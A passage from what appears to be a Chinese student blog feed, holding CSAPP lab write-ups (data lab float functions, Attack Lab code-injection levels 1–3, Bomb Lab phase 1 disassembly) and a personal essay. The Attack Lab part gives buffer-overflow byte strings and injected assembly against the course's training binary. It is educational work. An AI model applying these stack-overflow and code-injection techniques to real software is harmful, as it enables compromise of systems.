30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">floatFloat2Int</span><span class="params">(<span class="type">unsigned</span> uf)</span></span><br><span class="line">&#123;<span class="comment">//因为是将其转化为int型的整数,所以可以舍弃掉一些</span></span><br><span class="line">  <span class="type">unsigned</span> s = (uf &gt;&gt; <span class="number">31</span>) &amp; <span class="number">0x1</span>;</span><br><span class="line">  <span class="type">unsigned</span> expr = (uf &gt;&gt; <span class="number">23</span>) &amp; (<span class="number">0xFF</span>);</span><br><span class="line">  <span class="type">unsigned</span> frac = (uf &amp; <span class="number">0x7FFFFF</span>); <span class="comment">// 取到每个位</span></span><br><span class="line">  <span class="comment">// 讨论无穷大</span></span><br><span class="line">  <span class="keyword">if</span> (expr == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 当expr=0的时候,隐式位置位0,量级太小了,乘以2的-127次方更小</span></span><br><span class="line">  <span class="keyword">if</span> (expr == <span class="number">0xff</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> &lt;&lt; <span class="number">31</span>; <span class="comment">// 无穷大,按照题目要求输出0x80000000u.</span></span><br><span class="line">  <span class="comment">// 考虑规格化的情况</span></span><br><span class="line">  <span class="type">int</span> E = expr - <span class="number">127</span>;      <span class="comment">// E是阶码</span></span><br><span class="line">  frac = frac | (<span class="number">1</span> &lt;&lt; <span class="number">23</span>); <span class="comment">// 有一个隐式的一,要给他加上</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (E &gt; <span class="number">31</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> &lt;&lt; <span class="number">31</span>; <span class="comment">// 太大了,转成int就爆了</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (E &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 太小了,frac移动完后转成int直接被舍掉了</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (E &gt;= <span class="number">23</span>)</span><br><span class="line">    frac &lt;&lt;= (E - <span class="number">23</span>); <span class="comment">// 移位,因为M就是二进制的表示方式,所以直接移动小数点</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    frac &gt;&gt;= (<span class="number">23</span> - E);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!s)</span><br><span class="line">    <span class="keyword">return</span> frac;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> ~frac + <span class="number">1</span>; <span class="comment">// 其中已经把E乘进去了</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * floatPower2 - Return bit-level equivalent of the expression 2.0^x</span></span><br><span class="line"><span class="comment"> *   (2.0 raised to the power x) for any 32-bit integer x.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   The unsigned value that is returned should have the identical bit</span></span><br><span class="line"><span class="comment"> *   representation as the single-precision floating-point number 2.0^x.</span></span><br><span class="line"><span class="comment"> *   If the result is too small to be represented as a denorm, return</span></span><br><span class="line"><span class="comment"> *   0. If too large, return +INF.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. Also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="title function_">floatPower2</span><span class="params">(<span class="type">int</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 分析规格化和非规格化</span></span><br><span class="line">  <span class="keyword">if</span> (x &lt; <span class="number">-149</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// expr最小也要是1,故得到的E最小为-126</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (x &lt; <span class="number">-126</span>)</span><br><span class="line">  &#123; <span class="comment">// 多余的尾数,E只能提供2^(-126),剩下的靠尾数,尾数还能提供23位</span></span><br><span class="line">    <span class="type">int</span> a = x + <span class="number">126</span>;</span><br><span class="line">    a = <span class="number">23</span> + a;    <span class="comment">// 计算出偏移的位数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> &lt;&lt; a; <span class="comment">// 以上两种情况是非规格化的情况,能表示的数字更小</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (x &lt;= <span class="number">127</span>)</span><br><span class="line">  &#123; <span class="comment">// E的最大值是127,不能全为1</span></span><br><span class="line">    <span class="comment">// x=expr-bias;,一般bias是127</span></span><br><span class="line">    <span class="type">int</span> expr = x + <span class="number">127</span>;</span><br><span class="line">    <span class="keyword">return</span> expr &lt;&lt; <span class="number">23</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="number">0xFF</span>) &lt;&lt; <span class="number">23</span>;<span class="comment">//即为+INF</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CSAPP</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>csapp</tag>
      </tags>
  </entry>
  <entry>
    <title>Csapp的lab3-attacklab</title>
    <url>/CSAPP/lab3/2024/02/27/</url>
    <content><![CDATA[<blockquote>
<p>一个寒假没动,开学了,努努力把Attack Lab开盒了</p>
</blockquote>
<h1 id="Part-I-CI"><a href="#Part-I-CI" class="headerlink" title="Part I CI"></a>Part I CI</h1><h2 id="Level-1"><a href="#Level-1" class="headerlink" title="Level_1"></a>Level_1</h2><p>测试下这个程序</p>
<p>注意我们在执行ctarget程序的时候默认是连接到cmu的服务器，但是我们不是cmu的学生所以连不上服务器也就无法执行代码，所以执行的时候要加命令行参数 -q 以阻止连接到服务器的行为。</p>
<p>输入以下命令运行ctarget</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">./ctarget -q</span><br></pre></td></tr></table></figure>

<p>(同理,用gdb ctarget时,要注意run要写成run -q,不然就会试图链接远程服务器,然后报以下错误)</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402291454046.png" alt="image-20240229000718171"></p>
<p>随意的输入个string得知程序大致运行方式</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402291454085.png" alt="image-20240229000829319"></p>
<p>然后我们在做实验之前一定要看的pdf文档告诉我们以下信息<br>For Phase 1, you will not inject new code. Instead, your exploit string will redirect the program to execute<br>an existing procedure.<br>Function getbuf is called within CTARGET by a function test having the following C code:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    val = <span class="built_in">getbuf</span>();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;No exploit. Getbuf returned 0x%x\n&quot;</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>When getbuf executes its return statement (line 5 of getbuf), the program ordinarily resumes execution<br>within function test (at line 5 of this function). We want to change this behavior. Within the file ctarget,<br>there is code for a function touch1 having the following C representation:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">touch1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    vlevel = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Touch!: You called touch1()\n&quot;</span>);</span><br><span class="line">    <span class="built_in">validate</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Your task is to get CTARGET to execute the code for touch1 when getbuf executes its return statement,<br>rather than returning to test. Note that your exploit string may also corrupt parts of the stack not directly<br>related to this stage, but this will not cause a problem, since touch1 causes the program to exit directly.<br>Some Advice:<br>• All the information you need to devise your exploit string for this level can be determined by exam-<br>ining a disassembled version of CTARGET. Use objdump -d to get this dissembled version.<br>• The idea is to position a byte representation of the starting address for touch1 so that the ret<br>instruction at the end of the code for getbuf will transfer control to touch1.<br>• Be careful about byte ordering.<br>• You might want to use GDB to step the program through the last few instructions of getbuf to make<br>sure it is doing the right thing.<br>• The placement of buf within the stack frame for getbuf depends on the value of compile-time<br>constant BUFFER_SIZE, as well the allocation strategy used by GCC. You will need to examine the<br>disassembled code to determine its position.</p>
<p>所以我们要把touch1的函数位置来覆盖getbuf的返回值以便执行touch1</p>
<p>先输入查看汇编代码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">objdump -d ctarget &gt;ctarget.txt</span><br></pre></td></tr></table></figure>

<p>Getbuf:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:	48 83 ec 28          	sub    $0x28,%rsp;</span><br><span class="line">  4017ac:	48 89 e7             	mov    %rsp,%rdi</span><br><span class="line">  4017af:	e8 8c 02 00 00       	callq  401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  4017b9:	48 83 c4 28          	add    $0x28,%rsp</span><br><span class="line">  4017bd:	c3                   	retq   </span><br><span class="line">  4017be:	90                   	nop</span><br><span class="line">  4017bf:	90                   	nop</span><br></pre></td></tr></table></figure>

<p>Touch1:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004017c0 &lt;touch1&gt;:</span><br><span class="line">  4017c0:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc &lt;vlevel&gt;</span><br><span class="line">  4017cb:	00 00 00 </span><br><span class="line">  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi</span><br><span class="line">  4017d3:	e8 e8 f4 ff ff       	callq  400cc0 &lt;puts@plt&gt;</span><br><span class="line">  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  4017dd:	e8 ab 04 00 00       	callq  401c8d &lt;validate&gt;</span><br><span class="line">  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi</span><br><span class="line">  4017e7:	e8 54 f6 ff ff       	callq  400e40 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>

<p>0x28在十进制下2*16+8&#x3D;40个bytes,一个地址是8个bytes,所以我们想要在getbuf时跳转到touch1则需要缓冲区把原本的地址覆盖成0x004017c0,而那空余的四十个bytes想填啥填啥</p>
<p>即字节码为:(小端法,逆序存储)</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">c0 <span class="number">17</span> <span class="number">40</span> <span class="number">00</span></span><br></pre></td></tr></table></figure>

<p>保存该文件为p1.txt,然后把这个字节码转化成string,通过hex2raw,然后可以通过-i进行重定向输入,则完成level_1</p>
<p>输入命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./hex2raw &lt;p1.txt &gt;p1r.txt</span><br><span class="line">gdb ctarget</span><br><span class="line">run -q -i p1r.txt</span><br></pre></td></tr></table></figure>

<p>观察到以下信息则通关!</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402291454167.png" alt="image-20240229001752730"></p>
<h2 id="Level-2"><a href="#Level-2" class="headerlink" title="Level_2"></a>Level_2</h2><p>照例读一遍官方pdf文档:</p>
<p>Phase 2 involves injecting a small amount of code as part of your exploit string. Within the file ctarget there is code for a function <strong>touch2</strong> having the following C representation:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">touch2</span><span class="params">(<span class="type">unsigned</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">vlevel = <span class="number">2</span>;<span class="comment">/* Part of validation protocol */</span></span><br><span class="line"><span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Touch2!: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line"><span class="built_in">validate</span>(<span class="number">2</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line"><span class="built_in">fail</span>(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>Your task is to get CTARGET to execute the code for touch2 rather than returning to test. In this case,however, you must make it appear to touch2 as if you have passed your cookie as its argument.<code>你的任务是让CTARGET执行touch2的代码，而不是返回测试。但是，在这种情况下，您必须使它看起来像touch2一样，就像您已将cookie作为其参数传递一样。</code></p>
<p>Some Advice:<br>• You will want to position a byte representation of the address of your injected code in such a way that ret instruction at the end of the code for getbuf will transfer control to it.<code>您将希望以这样一种方式定位注入代码的地址的字节表示形式，即getbuf代码末尾的ret指令将控制权转移给它。</code><br>• Recall that the first argument to a function is passed in register %rdi.<code>回想一下，函数的第一个参数是在寄存器 % rdi中传递的。</code><br>• Your injected code should set the register to your cookie, and then use a ret instruction to transfer control to the first instruction in touch2.<code>您注入的代码应将寄存器设置为您的cookie，然后使用ret指令将控制权转移到touch2中的第一个指令。</code><br>• Do not attempt to use jmp or call instructions in your exploit code. The encodings of destination addresses for these instructions are difficult to formulate. Use ret instructions for all transfers of control, even when you are not returning from a call.<code>不要尝试在漏洞利用代码中使用jmp或调用指令。这些指令的目的地地址的编码难以公式化。对所有控制权转移使用ret指令，即使您没有从呼叫中返回。</code><br>• See the discussion in Appendix B on how to use tools to generate the byte-level representations of instruction sequence<code>请参阅附录b中有关如何使用工具生成指令序列的字节级表示的讨论</code></p>
<p>touch2</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004017ec &lt;touch2&gt;:</span><br><span class="line">  4017ec:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  4017f0:	89 fa                	mov    %edi,%edx</span><br><span class="line">  4017f2:	c7 05 e0 2c 20 00 02 	movl   $0x2,0x202ce0(%rip)        # 6044dc &lt;vlevel&gt;</span><br><span class="line">  4017f9:	00 00 00 </span><br><span class="line">  4017fc:	3b 3d e2 2c 20 00    	cmp    0x202ce2(%rip),%edi        # 6044e4 &lt;cookie&gt;</span><br><span class="line">  401802:	75 20                	jne    401824 &lt;touch2+0x38&gt;</span><br><span class="line">  401804:	be e8 30 40 00       	mov    $0x4030e8,%esi</span><br><span class="line">  401809:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  40180e:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401813:	e8 d8 f5 ff ff       	callq  400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401818:	bf 02 00 00 00       	mov    $0x2,%edi</span><br><span class="line">  40181d:	e8 6b 04 00 00       	callq  401c8d &lt;validate&gt;</span><br><span class="line">  401822:	eb 1e                	jmp    401842 &lt;touch2+0x56&gt;</span><br><span class="line">  401824:	be 10 31 40 00       	mov    $0x403110,%esi</span><br><span class="line">  401829:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  40182e:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401833:	e8 b8 f5 ff ff       	callq  400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401838:	bf 02 00 00 00       	mov    $0x2,%edi</span><br><span class="line">  40183d:	e8 0d 05 00 00       	callq  401d4f &lt;fail&gt;</span><br><span class="line">  401842:	bf 00 00 00 00       	mov    $0x0,%edi</span><br><span class="line">  401847:	e8 f4 f5 ff ff       	callq  400e40 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>

<p>所以我要做的应该是把%rdi中的值变成cookie的值,这样在比较时便会通过.</p>
<p>知识扫盲:汇编语言中的ret指令是call指令的逆操作，它表示从子程序中返回到主程序。执行ret指令时，CPU会从堆栈中弹出上一个储存的PC值，并将其加载到PC寄存器中，程序就回到了主程序中继续执行。</p>
<p>所以我要注入一段代码,将cookie中的值推送到%edi中,并且通过retq进行连环跳转,我们先写出这段代码,将cookie的值压入rdi中,然后将touch2的地址压入栈顶,最后ret会弹出该栈并且执行touch2</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov $0x59b997fa, %rdi</span><br><span class="line">pushq $0x4017ec</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>接下来我们要得到机器代码(编译再反汇编得到机器代码指令)</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402291454206.png" alt="image-20240229135419686"></p>
<p>然后通过gdb挑选一个注入代码的位置,这里我们选择getbuf中的$rsp栈顶作为代码注入位置,通过gdb命令探测到rsp的地址,即栈顶地址</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402291454240.png" alt="image-20240229135832513"></p>
<p>p $rsp&#x3D;0x5561dc78</p>
<p>这样我们就可以开始编我们的进攻序列</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402291454272.png" alt="image-20240229135914385"></p>
<p>覆盖的地址要依照小端法逆序,而机器指令不用逆序,中间填充字符,当然可以考虑换一个代码注入位置.编完后我们要用hex2raw来转换进攻字节以便于生成进攻字符串</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./hex2raw &lt;t2.txt&gt;t2r.txt</span><br><span class="line">./ctarget -q -i t2r.txt</span><br></pre></td></tr></table></figure>

<p>然后提交会得到以下结果,圆满过关!</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402291454304.png" alt="image-20240229140830699"></p>
<h2 id="Level-3"><a href="#Level-3" class="headerlink" title="Level_3"></a>Level_3</h2><p>看一下官方文档:</p>
<p>Phase 3 also involves a code injection attack, but passing a string as argument. Within the file ctarget there is code for functions hexmatch and touch3 having the following C representations:</p>
<p>touch3:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">touch3</span><span class="params">(<span class="type">char</span> \*sval)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">vlevel = <span class="number">3</span>; <span class="comment">/*Part of validation protocol */</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">hexmatch</span>(cookie, sval)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line"><span class="built_in">validate</span>(<span class="number">3</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line"><span class="built_in">fail</span>(<span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Compare string to hex represention of unsigned value */</span><span class="comment">//将字符串与无符号值的十六进制表示进行比较</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">hexmatch</span><span class="params">(<span class="type">unsigned</span> val, <span class="type">char</span> *sval)</span> </span>&#123;</span><br><span class="line"><span class="type">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line"><span class="comment">/*Make position of check string unpredictable */</span><span class="comment">//使检查字符串的位置不可预测</span></span><br><span class="line"><span class="type">char</span> *s = cbuf + <span class="built_in">random</span>() % <span class="number">100</span>;</span><br><span class="line"><span class="built_in">sprintf</span>(s, <span class="string">&quot;%.8x&quot;</span>, val);</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Your task is to get CTARGET to execute the code for touch3 rather than returning to test. You must make it appear to touch3 as if you have passed a string representation of your cookie as its argument.<code>您必须使其显示为touch3，就像您已将cookie的字符串表示形式作为其参数一样。</code><br>Some Advice:<br>• You will need to include a string representation of your cookie in your exploit string. The string should consist of the eight hexadecimal digits (ordered from most to least significant) without a leading “0x.”<code>您需要在进攻字符串中包含一个代表你cookie的字符串。该字符串应由八个十六进制数字 (从最高到最低有效排序) 组成，没有前导 “0x”。</code><br>• Recall that a string is represented in C as a sequence of bytes followed by a byte with value 0. Type “man ascii” on any Linux machine to see the byte representations of the characters you need.<code>回想一下，字符串在C中表示为字节序列，后跟值为0的字节。在任何Linux机器上键入 “man ascii” 以查看所需字符的字节表示。</code><br>• Your injected code should set register %rdi to the address of this string.<code>注入的代码应将寄存器 % rdi设置为该字符串的地址。</code><br>• When functions hexmatch and strncmp are called, they push data onto the stack, overwriting portions of memory that held the buffer used by getbuf. As a result, you will need to be careful where you place the string representation of your cookie.<code> 当调用函数hexmatch和strncmp时，它们将数据推送到堆栈上，覆盖保存getbuf使用的缓冲区的内存部分。因此，您需要小心放置cookie的字符串表示形式。</code></p>
<p>解决问题逻辑如下:</p>
<p>将cookie字符用man ascii命令转换成ascii码,hexmatch和strncmp可能会覆盖getbuf的空间,所以我们要找一个安全的栈空间存放进攻代码,我们知道一开始getbuf分配的栈空间为0x5561dc78-0x5561dca0,*s &#x3D; cbuf + (1~99),</p>
]]></content>
      <categories>
        <category>CSAPP</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>csapp</tag>
      </tags>
  </entry>
  <entry>
    <title>【镜花水月】人之所向</title>
    <url>/PASTFUTURE/1/2023/12/12/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><blockquote>
<p>对人为何，何为人的思考每每绊人心，十余年来不得明了，或许也是，毕竟文人墨客千百余年朝天发问，也只落得一个无病呻吟的恶名，但呀，人不总是这样，总想一抒己见，以表情感。</p>
</blockquote>
<h3 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h3><p>人的目的是什么？一个人活着是为了什么？你学习是为了什么？抛去那些莫须有的，自我欺骗的借口<del>考研，考公，绩点</del>，我只想问，一个人该干什么？还是说人之所以为人就在于他可以自由的支配自己的生活，自由的承担选择的后果，也自由的后悔。</p>
<h3 id="态度"><a href="#态度" class="headerlink" title="态度"></a>态度</h3><p>何为态度？如何的态度才是正确的？</p>
<p>这几日军训。主打一个锻炼集体意识，锻炼记录，锻炼团队，但教官是很人性化的，知道学生需要什么，不需要什么，就像是一场贸易，双方都知道其所需，可见生活的不同阶段，不同经历，都需要不同的态度，当然，这些态度也可以抽象化，以认真，遵守，概括一切，但这未免太过于敷衍且不切合实际了，但深究起来又会无趣无味。</p>
<p>当然，大脑思绪混乱，吾到至今也未曾想好怎么回答这个问题，从小便接触我是谁，我在哪，我要去哪这个问题，到之后开始探讨最完美的死亡方式，掌控死亡，突然有个荒诞的念想，完美的死亡不就是活着么，想活着所经受的压力，困苦实在是太多太多，死了一了百了，生不带来，死不带去，但活着才能感受痛苦，从心理到生理，当然也能收获温暖，快乐，和幸福。</p>
<h4 id="惰性"><a href="#惰性" class="headerlink" title="惰性"></a>惰性</h4><p>人是有惰性的,自我感觉人总会潜移默化的被他人所影响和改变,具体体现在自己的口头禅,说话风格的一些细小的改变,对人处事态度的细小变化,还有思想行为习惯的重点变化,但是呀,当一个人脱离熟悉的环境太久,或者是换到了另一个熟悉的环境,脱离了那群互相影响的人之后,那与生俱来,或者说是存在了太久的思想惯性—惰性便会主导你的行为,让你能够有勇气在床上躺到中午,让你有勇气在床上玩手机玩到凌晨,让你有勇气在打破自己的所有计划,让你有勇气和曾经的进化说ByeBye,人,是复杂的,离谱的,不受控的.</p>
<p>当然,也有可能是我的改变不够深刻,那巨大的思维惯性始终在引导我往我理性的反方向前进,<strong>革命之路,任重道远</strong>.</p>
<h3 id="Good-Lucky"><a href="#Good-Lucky" class="headerlink" title="Good Lucky"></a>Good Lucky</h3><blockquote>
<p>保持思考，保持敬畏</p>
</blockquote>
]]></content>
      <categories>
        <category>PASTFUTURE</category>
      </categories>
      <tags>
        <tag>镜花水月</tag>
        <tag>人</tag>
      </tags>
  </entry>
  <entry>
    <title>Csapp的lab2-bomblab的最全详解</title>
    <url>/CSAPP/lab2/2024/01/21/</url>
    <content><![CDATA[<blockquote>
<p>这个lab2真的做了很久,做的久,解析写的也久,还抽了部分打题的时间写的,这个lab是真的有意思</p>
</blockquote>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识:"></a>前置知识:</h2><ul>
<li><a href="https://zhzvite.github.io/EATPOOP/gdb_use/2024/01/17/">gdb使用指北</a></li>
<li>汇编语言的基本语法</li>
<li>链表</li>
<li>递归函数</li>
<li>耐得住诱惑</li>
</ul>
<h2 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0000000000400ee0 &lt;+0&gt;:     sub    $0x8,%rsp</span><br><span class="line">0x0000000000400ee4 &lt;+4&gt;:     mov    $0x402400,%esi</span><br><span class="line">0x0000000000400ee9 &lt;+9&gt;:     callq  0x401338 &lt;strings_not_equal&gt;</span><br><span class="line">0x0000000000400eee &lt;+14&gt;:    test   %eax,%eax</span><br><span class="line">0x0000000000400ef0 &lt;+16&gt;:    je     0x400ef7 &lt;phase_1+23&gt;</span><br><span class="line">0x0000000000400ef2 &lt;+18&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">0x0000000000400ef7 &lt;+23&gt;:    add    $0x8,%rsp</span><br><span class="line">0x0000000000400efb &lt;+27&gt;:    retq</span><br></pre></td></tr></table></figure>

<p>phase_1算是热身的一关，主要就是要发现到<strong>0x402400</strong>这个特殊的内存地址，毕竟默认下第一个参数是%rdi，那么第二个参数就是%rsi,有充分的理由怀疑，是在<strings_not_equal>这个函数里面对%rdi和%rsi里面的内存的函数值进行了比较,然后去这个函数里面看一看,可以猜出来时相等的话返回值是0,(test %eax,%eax),所以直接连string函数都不用看了,直接把0x402400里面的值找出来就是答案</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p(char*)0x402400</span><br></pre></td></tr></table></figure>

<p>当热身了.</p>
<string_not_equal>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">40135c:	0f b6 03             	movzbl (%rbx),%eax    ; 将 %rbx 指向的字节加载到 %eax 中，并进行零扩展为32位</span><br><span class="line">40135f:	84 c0                	test   %al,%al       ; 测试 %al 中的值是否为零</span><br><span class="line">401361:	74 25                	je     401388 &lt;strings_not_equal+0x50&gt;  ; 如果为零（字符串结束），跳转到 401388</span><br><span class="line"></span><br><span class="line">401363:	3a 45 00             	cmp    0x0(%rbp),%al   ; 比较地址为 (%rbp) 的字节与 %al 中的值</span><br><span class="line">401366:	74 0a                	je     401372 &lt;strings_not_equal+0x3a&gt;  ; 如果相等，跳转到 401372</span><br><span class="line"></span><br><span class="line">401368:	eb 25                	jmp    40138f &lt;strings_not_equal+0x57&gt;  ; 比较不匹配，跳转到 40138f</span><br><span class="line"></span><br><span class="line">40136a:	3a 45 00             	cmp    0x0(%rbp),%al   ; 比较地址为 (%rbp) 的字节与 %al 中的值</span><br><span class="line">40136d:	0f 1f 00             	nopl   (%rax)         ; No operation，占位符，可忽略</span><br><span class="line">401370:	75 24                	jne    401396 &lt;strings_not_equal+0x5e&gt;  ; 如果不相等，跳转到 401396</span><br><span class="line"></span><br><span class="line">401372:	48 83 c3 01          	add    $0x1,%rbx       ; 将 %rbx 增加 1（移动到第一个字符串的下一个字符）</span><br><span class="line">401376:	48 83 c5 01          	add    $0x1,%rbp       ; 将 %rbp 增加 1（移动到第二个字符串的下一个字符）</span><br><span class="line"></span><br><span class="line">40137a:	0f b6 03             	movzbl (%rbx),%eax    ; 将 %rbx 指向的字节加载到 %eax 中，并进行零扩展为32位</span><br><span class="line">40137d:	84 c0                	test   %al,%al       ; 测试 %al 中的值是否为零</span><br><span class="line">40137f:	75 e9                	jne    40136a &lt;strings_not_equal+0x32&gt;  ; 如果不为零，继续比较</span><br><span class="line"></span><br><span class="line">401381:	ba 00 00 00 00       	mov    $0x0,%edx      ; 将 0 移动到 %edx（表示字符串相等）</span><br><span class="line">401386:	eb 13                	jmp    40139b 